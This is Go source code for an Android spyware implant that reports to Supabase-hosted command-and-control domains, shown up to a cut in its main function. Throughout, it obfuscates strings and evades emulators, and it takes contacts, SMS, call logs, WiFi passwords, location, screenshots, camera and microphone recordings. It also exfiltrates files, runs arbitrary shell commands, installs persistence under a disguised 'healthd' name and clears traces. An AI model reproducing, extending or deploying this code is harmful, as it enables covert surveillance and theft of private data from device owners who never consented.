package main

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

// ============================================================
// CONFIG — replaced by build_android.py at build time
// ============================================================

var (
	c2Domain1 = "PLACEHOLDER_C2_DOMAIN_1"
	c2Domain2 = "PLACEHOLDER_C2_DOMAIN_2"
	c2APIKey  = "PLACEHOLDER_C2_APIKEY"
	xorKey    = byte(0x5A)
)

// ============================================================
// XOR STRING OBFUSCATION (matches Windows agent)
// ============================================================

var (
	encContentType = []byte{0x3B, 0x2A, 0x2A, 0x36, 0x33, 0x39, 0x3B, 0x2E, 0x33, 0x35, 0x34, 0x75, 0x30, 0x29, 0x35, 0x34, 0x61, 0x39, 0x32, 0x3B, 0x28, 0x29, 0x3F, 0x2E, 0x67, 0x2F, 0x2E, 0x3C, 0x77, 0x62}
	encAPIKey      = []byte{0x3B, 0x2A, 0x33, 0x31, 0x3F, 0x23}
	encAuth        = []byte{0x1B, 0x2F, 0x2E, 0x32, 0x35, 0x28, 0x33, 0x20, 0x3B, 0x2E, 0x33, 0x35, 0x34}
	encBearer      = []byte{0x18, 0x3F, 0x3B, 0x28, 0x3F, 0x28, 0x7A}
	encPrefer      = []byte{0x0A, 0x28, 0x3F, 0x3C, 0x3F, 0x28}
	encUpsert      = []byte{0x28, 0x3F, 0x29, 0x35, 0x36, 0x2F, 0x2E, 0x33, 0x35, 0x34, 0x67, 0x37, 0x3F, 0x28, 0x3D, 0x3F, 0x77, 0x3E, 0x2F, 0x2A, 0x36, 0x33, 0x39, 0x3B, 0x2E, 0x3F, 0x29}
)

func xd(data []byte) string {
	r := make([]byte, len(data))
	for i, b := range data {
		r[i] = b ^ xorKey
	}
	return string(r)
}

// User agents for requests
var userAgents = []string{
	"Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Android 11; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0",
}

// ============================================================
// SUPABASE C2 CLIENT
// ============================================================

type SupabaseC2 struct {
	domains   []string
	apiKey    string
	machineID string
	client    *http.Client
}

type Command struct {
	ID        string `json:"id"`
	MachineID string `json:"machine_id"`
	Command   string `json:"command"`
	Args      string `json:"args"`
	Status    string `json:"status"`
	Result    string `json:"result"`
}

func NewC2(domains []string, apiKey, machineID string) *SupabaseC2 {
	return &SupabaseC2{
		domains:   domains,
		apiKey:    apiKey,
		machineID: machineID,
		client:    &http.Client{Timeout: 30 * time.Second},
	}
}

func (c *SupabaseC2) doRequest(method, path string, body io.Reader, extra map[string]string) (*http.Response, error) {
	for _, domain := range c.domains {
		url := "https://" + domain + path
		req, err := http.NewRequest(method, url, body)
		if err != nil {
			continue
		}
		// Use obfuscated headers like Windows agent
		if body != nil {
			req.Header.Set(xd(encContentType), "application/json")
		}
		req.Header.Set(xd(encAPIKey), c.apiKey)
		req.Header.Set(xd(encAuth), xd(encBearer)+c.apiKey)
		req.Header.Set("X-Machine-ID", c.machineID)
		// Randomize User-Agent
		req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
		for k, v := range extra {
			req.Header.Set(k, v)
		}
		resp, err := c.client.Do(req)
		if err == nil {
			return resp, nil
		}
	}
	return nil, fmt.Errorf("all C2 domains failed")
}

func (c *SupabaseC2) Register(name, user, osInfo, ip string, isAdmin bool) error {
	payload := map[string]interface{}{
		"machine_id":   c.machineID,
		"machine_name": name,
		"username":     user,
		"os":           osInfo,
		"ip":           ip,
		"is_admin":     isAdmin,
		"last_seen":    time.Now().UTC().Format(time.RFC3339),
		"created_at":   time.Now().UTC().Format(time.RFC3339),
	}
	data, _ := json.Marshal(payload)
	// Use same query format as Windows agent
	resp, err := c.doRequest("POST", "/rest/v1/clients?on_conflict=machine_id", bytes.NewReader(data), map[string]string{
		xd(encPrefer): xd(encUpsert),
	})
	if err != nil {
		return err
	}
	resp.Body.Close()
	return nil
}

func (c *SupabaseC2) Heartbeat() {
	payload := map[string]interface{}{
		"last_seen": time.Now().UTC().Format(time.RFC3339),
		"ip":        getPublicIP(),
		"is_admin":  isRooted(),
	}
	data, _ := json.Marshal(payload)
	resp, err := c.doRequest("PATCH", "/rest/v1/clients?machine_id=eq."+c.machineID, bytes.NewReader(data), nil)
	if err == nil {
		resp.Body.Close()
	}
}

func getPublicIP() string {
	// Use Go net/http like Windows agent (curl may not exist on Android)
	cl := &http.Client{Timeout: 5 * time.Second}
	for _, svc := range []string{"https://api.ipify.org", "https://icanhazip.com", "https://ifconfig.me/ip"} {
		resp, err := cl.Get(svc)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		ip := strings.TrimSpace(string(body))
		if ip != "" {
			return ip
		}
	}
	return "unknown"
}

func (c *SupabaseC2) PollCommands() []Command {
	// Match Windows agent - no limit
	path := fmt.Sprintf("/rest/v1/commands?or=(machine_id.eq.%s,machine_id.eq.*)&status=eq.pending&order=created_at.asc", c.machineID)
	resp, err := c.doRequest("GET", path, nil, nil)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	var cmds []Command
	json.NewDecoder(resp.Body).Decode(&cmds)
	return cmds
}

func (c *SupabaseC2) UpdateCommand(id, status, result string) {
	if len(result) > 50000 {
		result = result[:50000] + "\n...[truncated]"
	}
	payload := map[string]interface{}{
		"status":      status,
		"result":      result,
		"executed_at": time.Now().UTC().Format(time.RFC3339),
	}
	data, _ := json.Marshal(payload)
	resp, err := c.doRequest("PATCH", "/rest/v1/commands?id=eq."+id, bytes.NewReader(data), nil)
	if err == nil {
		resp.Body.Close()
	}
}

func (c *SupabaseC2) SendSystemInfo(infoType string, data interface{}) {
	payload := map[string]interface{}{
		"machine_id": c.machineID,
		"info_type":  infoType,
		"data":       data,
		"created_at": time.Now().UTC().Format(time.RFC3339),
	}
	d, _ := json.Marshal(payload)
	resp, err := c.doRequest("POST", "/rest/v1/system_info", bytes.NewReader(d), nil)
	if err == nil {
		resp.Body.Close()
	}
}

func (c *SupabaseC2) SendKeylog(keys, windowTitle string) {
	payload := map[string]interface{}{
		"machine_id":   c.machineID,
		"keystrokes":   keys,
		"window_title": windowTitle,
		"created_at":   time.Now().UTC().Format(time.RFC3339),
	}
	d, _ := json.Marshal(payload)
	resp, err := c.doRequest("POST", "/rest/v1/keylogs", bytes.NewReader(d), nil)
	if err == nil {
		resp.Body.Close()
	}
}

func (c *SupabaseC2) UploadFile(filename string, data []byte, fileType string) error {
	// Match Windows agent - send raw binary with headers
	req, err := http.NewRequest("POST", "https://"+c.domains[0]+"/functions/v1/file-upload", bytes.NewReader(data))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set(xd(encAPIKey), c.apiKey)
	req.Header.Set(xd(encAuth), xd(encBearer)+c.apiKey)
	req.Header.Set("X-Machine-ID", c.machineID)
	req.Header.Set("X-Filename", filename)
	req.Header.Set("X-Filepath", "")
	req.Header.Set("X-Type", fileType)
	req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])

	resp, err := c.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	io.ReadAll(resp.Body)

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return fmt.Errorf("upload HTTP %d", resp.StatusCode)
	}
	return nil
}

// ============================================================
// JOB MANAGER
// ============================================================

type JobManager struct {
	mu   sync.Mutex
	jobs map[string]context.CancelFunc
}

func NewJobManager() *JobManager {
	return &JobManager{jobs: make(map[string]context.CancelFunc)}
}

func (jm *JobManager) Start(name string, fn func(ctx context.Context)) {
	jm.mu.Lock()
	defer jm.mu.Unlock()
	if cancel, ok := jm.jobs[name]; ok {
		cancel()
	}
	ctx, cancel := context.WithCancel(context.Background())
	jm.jobs[name] = cancel
	go fn(ctx)
}

func (jm *JobManager) Stop(name string) bool {
	jm.mu.Lock()
	defer jm.mu.Unlock()
	if cancel, ok := jm.jobs[name]; ok {
		cancel()
		delete(jm.jobs, name)
		return true
	}
	return false
}

func (jm *JobManager) StopAll() {
	jm.mu.Lock()
	defer jm.mu.Unlock()
	for name, cancel := range jm.jobs {
		cancel()
		delete(jm.jobs, name)
	}
}

func (jm *JobManager) List() []string {
	jm.mu.Lock()
	defer jm.mu.Unlock()
	var names []string
	for name := range jm.jobs {
		names = append(names, name)
	}
	return names
}

// ============================================================
// SHELL UTILITIES
// ============================================================

func shellExec(cmd string) (string, error) {
	c := exec.Command("sh", "-c", cmd)
	out, err := c.CombinedOutput()
	return strings.TrimSpace(string(out)), err
}

func shellExecTimeout(cmd string, timeout time.Duration) (string, error) {
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()
	c := exec.CommandContext(ctx, "sh", "-c", cmd)
	out, err := c.CombinedOutput()
	return strings.TrimSpace(string(out)), err
}

func getProp(key string) string {
	out, _ := shellExec("getprop " + key)
	return out
}

// ============================================================
// MACHINE ID
// ============================================================

func getMachineID() string {
	// Match Windows agent length (16 hex chars = 8 bytes)
	var fp strings.Builder

	// Try Android ID first
	aid, _ := shellExec("settings get secure android_id")
	if aid != "" && aid != "null" && len(aid) > 0 {
		fp.WriteString(aid)
	}

	// Add serial number
	serial := getProp("ro.serialno")
	fp.WriteString(serial)

	// Add model
	model := getProp("ro.product.model")
	fp.WriteString(model)

	hash := sha256.Sum256([]byte(fp.String()))
	return hex.EncodeToString(hash[:8]) // 16 hex chars
}

// ============================================================
// DEVICE INFO
// ============================================================

func getDeviceInfo() map[string]interface{} {
	info := make(map[string]interface{})
	info["platform"] = "android"
	info["model"] = getProp("ro.product.model")
	info["brand"] = getProp("ro.product.brand")
	info["manufacturer"] = getProp("ro.product.manufacturer")
	info["device"] = getProp("ro.product.device")
	info["android_version"] = getProp("ro.build.version.release")
	info["sdk_version"] = getProp("ro.build.version.sdk")
	info["build_id"] = getProp("ro.build.display.id")
	info["security_patch"] = getProp("ro.build.version.security_patch")
	info["serial"] = getProp("ro.serialno")
	info["hardware"] = getProp("ro.hardware")
	info["board"] = getProp("ro.product.board")
	info["abi"] = getProp("ro.product.cpu.abi")

	// Network info
	ip, _ := shellExec("ip route get 1.1.1.1 2>/dev/null | awk '{print $7}' | head -1")
	info["ip"] = ip

	// External IP (use Go net/http, not curl)
	info["external_ip"] = getPublicIP()

	// Battery
	battery, _ := shellExec("dumpsys battery 2>/dev/null | grep -E 'level|status|temperature' | head -5")
	info["battery"] = battery

	// Memory
	mem, _ := shellExec("cat /proc/meminfo | head -3")
	info["memory"] = mem

	// Storage
	storage, _ := shellExec("df -h /data 2>/dev/null | tail -1")
	info["storage"] = storage

	// Root check
	_, errSu := exec.LookPath("su")
	_, errMagisk := os.Stat("/sbin/magisk")
	info["rooted"] = errSu == nil || errMagisk == nil

	// Uptime
	uptime, _ := shellExec("cat /proc/uptime | awk '{print $1}'")
	info["uptime_seconds"] = uptime

	return info
}

func isRooted() bool {
	_, errSu := exec.LookPath("su")
	_, errMagisk := os.Stat("/sbin/magisk")
	_, errMagisk2 := os.Stat("/system/app/Superuser.apk")
	return errSu == nil || errMagisk == nil || errMagisk2 == nil
}

// ============================================================
// ANDROID-SPECIFIC COMMANDS
// ============================================================

func getContacts() (string, error) {
	return shellExecTimeout("content query --uri content://com.android.contacts/contacts --projection display_name:number 2>/dev/null | head -500", 15*time.Second)
}

func getSMS() (string, error) {
	return shellExecTimeout("content query --uri content://sms --projection address:body:date:type --sort \"date DESC\" 2>/dev/null | head -500", 15*time.Second)
}

func getCallLog() (string, error) {
	return shellExecTimeout("content query --uri content://call_log/calls --projection number:name:duration:date:type --sort \"date DESC\" 2>/dev/null | head -500", 15*time.Second)
}

func getInstalledApps() (string, error) {
	return shellExecTimeout("pm list packages -f 2>/dev/null", 15*time.Second)
}

func getWifiInfo() (string, error) {
	var sb strings.Builder

	// Current connection
	current, _ := shellExec("dumpsys wifi | grep 'mWifiInfo' | head -3")
	sb.WriteString("=== Current WiFi ===\n")
	sb.WriteString(current)
	sb.WriteString("\n\n")

	// Saved networks
	saved, _ := shellExec("dumpsys wifi | grep 'ConfigKey' | head -20")
	sb.WriteString("=== Saved Networks ===\n")
	sb.WriteString(saved)
	sb.WriteString("\n\n")

	// WiFi passwords (requires root)
	if isRooted() {
		passwords, _ := shellExec("su -c 'cat /data/misc/wifi/WifiConfigStore.xml' 2>/dev/null | grep -E 'SSID|PreSharedKey' | head -40")
		if passwords != "" {
			sb.WriteString("=== WiFi Passwords ===\n")
			sb.WriteString(passwords)
		}
	}

	return sb.String(), nil
}

func getLocation() (string, error) {
	// Try dumpsys location
	loc, _ := shellExecTimeout("dumpsys location | grep -A2 'last location' | head -10", 10*time.Second)
	if loc != "" {
		return loc, nil
	}
	// Fallback
	loc, _ = shellExecTimeout("dumpsys location | grep -E 'Location\\[' | head -5", 10*time.Second)
	return loc, nil
}

func getClipboard() (string, error) {
	return shellExecTimeout("service call clipboard 2 s16 com.devicehealth.service 2>/dev/null", 5*time.Second)
}

func takeScreenshot() ([]byte, error) {
	tmpPath := filepath.Join(os.TempDir(), "screen.png")
	defer os.Remove(tmpPath)

	_, err := shellExecTimeout("screencap -p "+tmpPath, 10*time.Second)
	if err != nil {
		// Try without -p flag
		_, err = shellExecTimeout("screencap "+tmpPath, 10*time.Second)
		if err != nil {
			return nil, fmt.Errorf("screencap failed: %v", err)
		}
	}

	data, err := os.ReadFile(tmpPath)
	if err != nil {
		return nil, err
	}
	return data, nil
}

func takePhoto() ([]byte, error) {
	tmpPath := filepath.Join(os.TempDir(), "photo.jpg")
	defer os.Remove(tmpPath)

	// Try using am to trigger camera capture (limited, needs root or specific setup)
	_, err := shellExecTimeout(fmt.Sprintf(
		"am start -a android.media.action.IMAGE_CAPTURE --ez return-data true 2>/dev/null; sleep 3; screencap -p %s",
		tmpPath), 15*time.Second)
	if err != nil {
		return nil, fmt.Errorf("camera capture failed: %v", err)
	}

	data, err := os.ReadFile(tmpPath)
	if err != nil {
		return nil, err
	}
	return data, nil
}

func recordAudio(seconds int) ([]byte, error) {
	if seconds <= 0 || seconds > 300 {
		seconds = 30
	}
	tmpPath := filepath.Join(os.TempDir(), "recording.3gp")
	defer os.Remove(tmpPath)

	// Use mediarecorder via am or toolbox
	_, err := shellExecTimeout(fmt.Sprintf(
		"am startservice -a android.media.action.RECORD_AUDIO 2>/dev/null; "+
			"sleep %d; "+
			"am stopservice -a android.media.action.RECORD_AUDIO 2>/dev/null",
		seconds), time.Duration(seconds+10)*time.Second)
	if err != nil {
		// Fallback: try ffmpeg if available
		_, err = shellExecTimeout(fmt.Sprintf(
			"ffmpeg -f android_audio -i default -t %d -y %s 2>/dev/null",
			seconds, tmpPath), time.Duration(seconds+10)*time.Second)
		if err != nil {
			return nil, fmt.Errorf("audio recording failed: %v", err)
		}
	}

	data, err := os.ReadFile(tmpPath)
	if err != nil {
		return nil, err
	}
	return data, nil
}

func getFolderTree(root string, maxDepth int) string {
	if root == "" {
		root = "/sdcard"
	}
	if maxDepth <= 0 {
		maxDepth = 3
	}
	out, _ := shellExecTimeout(fmt.Sprintf("find %s -maxdepth %d -type f 2>/dev/null | head -500", root, maxDepth), 15*time.Second)
	return out
}

func showToast(msg string) {
	// Requires a running activity or accessibility service; best-effort via am
	shellExec(fmt.Sprintf("am broadcast -a android.intent.action.SHOW_TOAST --es message '%s' 2>/dev/null", msg))
}

func openURL(url string) {
	shellExec(fmt.Sprintf("am start -a android.intent.action.VIEW -d '%s' 2>/dev/null", url))
}

func vibrateDevice(ms int) {
	if ms <= 0 {
		ms = 500
	}
	shellExec(fmt.Sprintf("cmd vibrator_manager vibrate %d default 2>/dev/null || service call vibrator 2 i64 %d 2>/dev/null", ms, ms))
}

// ============================================================
// PERSISTENCE
// ============================================================

func persist() string {
	results := []string{}

	// Method 1: Copy to a location that survives reboots
	selfPath, err := os.Executable()
	if err != nil {
		selfPath = os.Args[0]
	}

	// Try /data/local/tmp (persists, accessible without root)
	persistDir := "/data/local/tmp/.cache"
	os.MkdirAll(persistDir, 0755)
	destPath := filepath.Join(persistDir, "healthd")

	data, err := os.ReadFile(selfPath)
	if err == nil {
		if err := os.WriteFile(destPath, data, 0755); err == nil {
			results = append(results, "Copied to "+destPath)
		}
	}

	// Method 2: Create init.d script (requires root)
	if isRooted() {
		initScript := fmt.Sprintf("#!/system/bin/sh\n%s &\n", destPath)
		scriptPath := "/system/etc/init.d/99healthd"
		if err := os.WriteFile(scriptPath, []byte(initScript), 0755); err == nil {
			results = append(results, "Created init.d script")
		}
	}

	if len(results) == 0 {
		return "Persistence failed — no writable locations"
	}
	return strings.Join(results, "; ")
}

func unpersist() string {
	results := []string{}
	paths := []string{
		"/data/local/tmp/.cache/healthd",
		"/system/etc/init.d/99healthd",
	}
	for _, p := range paths {
		if err := os.Remove(p); err == nil {
			results = append(results, "Removed "+p)
		}
	}
	if len(results) == 0 {
		return "Nothing to remove"
	}
	return strings.Join(results, "; ")
}

// ============================================================
// FILE EXFILTRATION
// ============================================================

func exfiltrateFiles(c2 *SupabaseC2, root string, extensions []string, maxSizeMB int) string {
	if root == "" {
		root = "/sdcard"
	}
	if maxSizeMB <= 0 {
		maxSizeMB = 5
	}
	maxBytes := int64(maxSizeMB * 1024 * 1024)

	extSet := make(map[string]bool)
	for _, e := range extensions {
		extSet[strings.ToLower(e)] = true
	}

	var count int
	filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() || count >= 50 {
			return nil
		}
		if info.Size() > maxBytes || info.Size() == 0 {
			return nil
		}

		ext := strings.ToLower(filepath.Ext(path))
		if len(extSet) > 0 && !extSet[ext] {
			return nil
		}

		data, err := os.ReadFile(path)
		if err != nil {
			return nil
		}

		c2.UploadFile(filepath.Base(path), data, "exfil")
		count++
		return nil
	})

	return fmt.Sprintf("Exfiltrated %d files from %s", count, root)
}

// ============================================================
// COMMAND HANDLER
// ============================================================

func handleCommand(c2 *SupabaseC2, jm *JobManager, cmd Command) (string, error) {
	switch cmd.Command {

	// --- System ---
	case "sysinfo":
		info := getDeviceInfo()
		c2.SendSystemInfo("android_sysinfo", info)
		data, _ := json.MarshalIndent(info, "", "  ")
		return string(data), nil

	case "isadmin":
		if isRooted() {
			return "Device is rooted (su/magisk available)", nil
		}
		return "Device is NOT rooted", nil

	case "shell":
		var args struct {
			Cmd string `json:"cmd"`
		}
		json.Unmarshal([]byte(cmd.Args), &args)
		if args.Cmd == "" {
			return "No command specified", fmt.Errorf("empty cmd")
		}
		out, err := shellExecTimeout(args.Cmd, 60*time.Second)
		if err != nil {
			return fmt.Sprintf("Error: %v\n%s", err, out), err
		}
		return out, nil

	// --- Surveillance ---
	case "screenshot":
		data, err := takeScreenshot()
		if err != nil {
			return "Screenshot failed: " + err.Error(), err
		}
		err = c2.UploadFile("screenshot.png", data, "screenshot")
		if err != nil {
			return "Upload failed: " + err.Error(), err
		}
		return fmt.Sprintf("Screenshot captured (%d KB)", len(data)/1024), nil

	case "screenshots":
		var args struct {
			Interval int `json:"interval"`
		}
		json.Unmarshal([]byte(cmd.Args), &args)
		if args.Interval <= 0 {
			args.Interval = 30
		}
		jm.Start("screenshots", func(ctx context.Context) {
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}
				data, err := takeScreenshot()
				if err == nil {
					c2.UploadFile("screenshot.png", data, "screenshot")
				}
				time.Sleep(time.Duration(args.Interval) * time.Second)
			}
		})
		return fmt.Sprintf("Continuous screenshots started (every %ds)", args.Interval), nil

	case "contacts":
		out, err := getContacts()
		if err != nil {
			return "Failed: " + err.Error(), err
		}
		c2.SendSystemInfo("contacts", out)
		return out, nil

	case "sms_dump":
		out, err := getSMS()
		if err != nil {
			return "Failed: " + err.Error(), err
		}
		c2.SendSystemInfo("sms", out)
		return out, nil

	case "calllog":
		out, err := getCallLog()
		if err != nil {
			return "Failed: " + err.Error(), err
		}
		c2.SendSystemInfo("calllog", out)
		return out, nil

	case "apps":
		out, err := getInstalledApps()
		if err != nil {
			return "Failed: " + err.Error(), err
		}
		c2.SendSystemInfo("installed_apps", out)
		return out, nil

	case "wifi":
		out, err := getWifiInfo()
		if err != nil {
			return "Failed: " + err.Error(), err
		}
		c2.SendSystemInfo("wifi", out)
		return out, nil

	case "location":
		out, err := getLocation()
		if err != nil {
			return "Failed: " + err.Error(), err
		}
		c2.SendSystemInfo("location", out)
		return out, nil

	case "location_track":
		var args struct {
			Interval int `json:"interval"`
		}
		json.Unmarshal([]byte(cmd.Args), &args)
		if args.Interval <= 0 {
			args.Interval = 60
		}
		jm.Start("location_track", func(ctx context.Context) {
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}
				out, _ := getLocation()
				if out != "" {
					c2.SendKeylog(out, "location_track")
				}
				time.Sleep(time.Duration(args.Interval) * time.Second)
			}
		})
		return fmt.Sprintf("Location tracking started (every %ds)", args.Interval), nil

	case "clipboard":
		out, err := getClipboard()
		if err != nil {
			return "Failed: " + err.Error(), err
		}
		return out, nil

	case "camera":
		data, err := takePhoto()
		if err != nil {
			return "Camera failed: " + err.Error(), err
		}
		err = c2.UploadFile("photo.jpg", data, "camera")
		if err != nil {
			return "Upload failed: " + err.Error(), err
		}
		return fmt.Sprintf("Photo captured (%d KB)", len(data)/1024), nil

	case "microphone":
		var args struct {
			Seconds int `json:"seconds"`
		}
		json.Unmarshal([]byte(cmd.Args), &args)
		if args.Seconds <= 0 {
			args.Seconds = 30
		}
		data, err := recordAudio(args.Seconds)
		if err != nil {
			return "Recording failed: " + err.Error(), err
		}
		err = c2.UploadFile("recording.3gp", data, "audio")
		if err != nil {
			return "Upload failed: " + err.Error(), err
		}
		return fmt.Sprintf("Recorded %ds audio (%d KB)", args.Seconds, len(data)/1024), nil

	// --- Files ---
	case "foldertree":
		var args struct {
			Path  string `json:"path"`
			Depth int    `json:"depth"`
		}
		json.Unmarshal([]byte(cmd.Args), &args)
		out := getFolderTree(args.Path, args.Depth)
		return out, nil

	case "download":
		var args struct {
			Path string `json:"path"`
		}
		json.Unmarshal([]byte(cmd.Args), &args)
		if args.Path == "" {
			return "No path specified", fmt.Errorf("empty path")
		}
		data, err := os.ReadFile(args.Path)
		if err != nil {
			return "Read failed: " + err.Error(), err
		}
		err = c2.UploadFile(filepath.Base(args.Path), data, "download")
		if err != nil {
			return "Upload failed: " + err.Error(), err
		}
		return fmt.Sprintf("Downloaded %s (%d KB)", args.Path, len(data)/1024), nil

	case "upload":
		var args struct {
			Path string `json:"path"`
			Data string `json:"data"` // base64
		}
		json.Unmarshal([]byte(cmd.Args), &args)
		if args.Path == "" || args.Data == "" {
			return "Missing path or data", fmt.Errorf("missing args")
		}
		decoded, err := base64.StdEncoding.DecodeString(args.Data)
		if err != nil {
			return "Base64 decode failed", err
		}
		err = os.WriteFile(args.Path, decoded, 0644)
		if err != nil {
			return "Write failed: " + err.Error(), err
		}
		return fmt.Sprintf("Uploaded %d bytes to %s", len(decoded), args.Path), nil

	case "exfiltrate":
		var args struct {
			Path       string   `json:"path"`
			Extensions []string `json:"extensions"`
			MaxSizeMB  int      `json:"max_size_mb"`
		}
		json.Unmarshal([]byte(cmd.Args), &args)
		result := exfiltrateFiles(c2, args.Path, args.Extensions, args.MaxSizeMB)
		return result, nil

	// --- Control ---
	case "toast":
		var args struct {
			Message string `json:"message"`
		}
		json.Unmarshal([]byte(cmd.Args), &args)
		showToast(args.Message)
		return "Toast shown", nil

	case "openurl":
		var args struct {
			URL string `json:"url"`
		}
		json.Unmarshal([]byte(cmd.Args), &args)
		openURL(args.URL)
		return "Opened " + args.URL, nil

	case "vibrate":
		var args struct {
			Duration int `json:"duration"`
		}
		json.Unmarshal([]byte(cmd.Args), &args)
		vibrateDevice(args.Duration)
		return "Vibrating", nil

	case "persist":
		return persist(), nil

	case "unpersist":
		return unpersist(), nil

	case "cleanup":
		var cleaned []string
		// Clear temp files
		os.RemoveAll(os.TempDir())
		cleaned = append(cleaned, "Cleared temp dir")
		// Clear shell history
		os.Remove(os.Getenv("HOME") + "/.bash_history")
		os.Remove(os.Getenv("HOME") + "/.sh_history")
		cleaned = append(cleaned, "Cleared shell history")
		return strings.Join(cleaned, "; "), nil

	// --- Jobs ---
	case "jobs":
		jobs := jm.List()
		if len(jobs) == 0 {
			return "No active jobs", nil
		}
		return strings.Join(jobs, "\n"), nil

	case "kill":
		var args struct {
			Name string `json:"name"`
		}
		json.Unmarshal([]byte(cmd.Args), &args)
		if args.Name != "" {
			if jm.Stop(args.Name) {
				return "Stopped job: " + args.Name, nil
			}
			return "Job not found: " + args.Name, nil
		}
		return "No job name specified", nil

	case "ping":
		return "pong", nil

	case "sleep":
		var args struct {
			Seconds int `json:"seconds"`
		}
		json.Unmarshal([]byte(cmd.Args), &args)
		if args.Seconds == 0 {
			args.Seconds = 60
		}
		time.Sleep(time.Duration(args.Seconds) * time.Second)
		return fmt.Sprintf("Slept %d seconds", args.Seconds), nil

	case "pausejobs":
		jm.StopAll()
		return "All jobs stopped", nil

	case "resumejobs":
		jm.Start("screenshots", func(ctx context.Context) {
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}
				data, err := takeScreenshot()
				if err == nil {
					c2.UploadFile("screenshot.png", data, "screenshot")
				}
				time.Sleep(30 * time.Second)
			}
		})
		return "Default jobs resumed (screenshots)", nil

	case "antianalysis":
		var sb strings.Builder
		sb.WriteString("=== Anti-Analysis Report ===\n\n")
		sb.WriteString(fmt.Sprintf("Emulator detected: %v\n", isEmulator()))
		sb.WriteString(fmt.Sprintf("Rooted: %v\n", isRooted()))
		sb.WriteString(fmt.Sprintf("Hardware: %s\n", getProp("ro.hardware")))
		sb.WriteString(fmt.Sprintf("Model: %s\n", getProp("ro.product.model")))
		sb.WriteString(fmt.Sprintf("Device: %s\n", getProp("ro.product.device")))
		sb.WriteString(fmt.Sprintf("QEMU: %s\n", getProp("ro.kernel.qemu")))
		sb.WriteString(fmt.Sprintf("Characteristics: %s\n", getProp("ro.build.characteristics")))
		// Check for analysis tools
		tools := []string{"frida-server", "objection", "drozer", "tcpdump", "strace", "gdb"}
		var found []string
		for _, t := range tools {
			if _, err := exec.LookPath(t); err == nil {
				found = append(found, t)
			}
		}
		if len(found) > 0 {
			sb.WriteString(fmt.Sprintf("Analysis tools found: %s\n", strings.Join(found, ", ")))
		} else {
			sb.WriteString("Analysis tools found: none\n")
		}
		return sb.String(), nil

	case "options", "help":
		return `Available commands:
  ping              - Connection test
  sysinfo           - Full device information
  isadmin           - Check if device is rooted
  shell {cmd}       - Execute shell command
  screenshot        - Single screenshot
  screenshots       - Continuous screenshots (job)
  contacts          - Dump contacts
  sms_dump          - Dump SMS messages
  calllog           - Dump call log
  apps              - List installed apps
  wifi              - WiFi info + saved networks
  location          - Get last known location
  location_track    - Continuous location tracking (job)
  clipboard         - Read clipboard
  camera            - Take photo
  microphone        - Record audio
  foldertree        - List files in directory
  download {path}   - Download file from device
  upload {path,data}- Upload file to device
  exfiltrate        - Bulk file exfiltration
  toast {message}   - Show toast message
  openurl {url}     - Open URL in browser
  vibrate           - Vibrate device
  persist           - Install persistence
  unpersist         - Remove persistence
  cleanup           - Clear traces
  sleep {seconds}   - Sleep N seconds
  antianalysis      - Anti-analysis report
  jobs              - List active jobs
  kill {name}       - Stop a job
  pausejobs         - Stop all jobs
  resumejobs        - Resume default jobs
  exit              - Kill agent`, nil

	case "exit":
		c2.UpdateCommand(cmd.ID, "complete", "Exiting")
		os.Exit(0)
		return "", nil

	default:
		// Try as raw shell command
		out, err := shellExecTimeout(cmd.Command+" "+cmd.Args, 60*time.Second)
		if err != nil {
			return fmt.Sprintf("Error: %v\n%s", err, out), err
		}
		return out, nil
	}
}

// ============================================================
// ANTI-ANALYSIS
// ============================================================

func isEmulator() bool {
	checks := []struct {
		prop string
		bad  []string
	}{
		{"ro.hardware", []string{"goldfish", "ranchu", "vbox"}},
		{"ro.product.model", []string{"sdk", "emulator", "Android SDK"}},
		{"ro.kernel.qemu", []string{"1"}},
		{"ro.product.device", []string{"generic", "vbox"}},
		{"ro.build.characteristics", []string{"emulator"}},
	}
	for _, c := range checks {
		val := strings.ToLower(getProp(c.prop))
		for _, bad := range c.bad {
			if strings.Contains(val, strings.ToLower(bad)) {
				return true
			}
		}
	}

	// Check for emulator files
	emuFiles := []string{
		"/dev/socket/qemud",
		"/dev/qemu_pipe",
		"/system/lib/libc_malloc_debug_qemu.so",
		"/sys/qemu_trace",
	}
	for _, f := range emuFiles {
		if _, err := os.Stat(f); err == nil {
			return true
		}
	}
	return false
}

// ============================================================
// MAIN
// ============================================================

func main() {
	// Delay startup to avoid sandbox timing analysis
	time.Sleep(time.Duration(3+rand.Intn(5)) * time.Second)

	// Anti-emulator check
	if isEmulator() {
		// Sleep and exit quietly
		time.Sleep(30 * time.Second)
		os.Exit(0)
	}

	// Build machine ID
	machineID := getMachineID()

	// Resolve C2 domains
	domains := []string{}
	if c2Domain1 != "" && !strings.HasPrefix(c2Domain1, "PLACEHOLDER") {
		domains = append(domains, c2Domain1)
	}
	if c2Domain2 != "" && !strings.HasPrefix(c2Domain2, "PLACEHOLDER") {
		domains = append(domains, c2Domain2)
	}
	if len(domains) == 0 {
		os.Exit(1)
	}

	// Init C2 client
	c2 := NewC2(domains, c2APIKey, machineID)
	jm := NewJobManager()

	// Gather basic info for registration
	info := getDeviceInfo()
	model, _ := info["model"].(string)
	brand, _ := info["brand"].(string)
	deviceName := brand + " " + model
